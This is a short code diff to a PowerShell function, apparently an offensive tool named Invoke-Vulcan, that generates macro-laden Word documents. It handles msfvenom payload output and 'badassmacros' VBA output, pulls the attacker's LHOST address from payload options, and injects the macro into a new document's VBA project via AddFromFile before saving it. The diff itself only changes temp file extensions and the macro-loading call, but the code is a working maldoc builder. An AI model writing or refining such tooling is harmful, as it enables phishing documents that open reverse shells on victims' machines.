@@ -58,8 +58,8 @@ function Invoke-Vulcan {
     )
 
     begin {
-        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).docx"
-        $BAMOutput = "${env:TEMP}\badassmacros_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).txt"
+        $PayloadOutput = "${env:TEMP}\msfvenom_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).raw.txt"
+        $BAMOutput = "${env:TEMP}\badassmacros_$(Get-Date -Format yyyy-MM-dd_hh_mm_ss).vba"
         
         $Match = $payloadOptions | Select-String -Pattern "LHOST=(\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3})"
         $LHOST = $match.matches.groups[1].Value
@@ -112,8 +112,7 @@ function Create_WordDocument($BAMOutput, $Output) {
     $Doc = $Word.Documents.Add()
 
     $DocModule = $Doc.VBProject.VBComponents.Add(1)
-    $Macro = Get-Content -Path $BAMOutput
-    $DocModule.CodeModule.AddFromString($Macro)
+    $DocModule.CodeModule.AddFromFile($BAMOutput)
 
     Write-Host "[+] Word document written to: $Output" 
     $Doc.SaveAs($Output, 0)
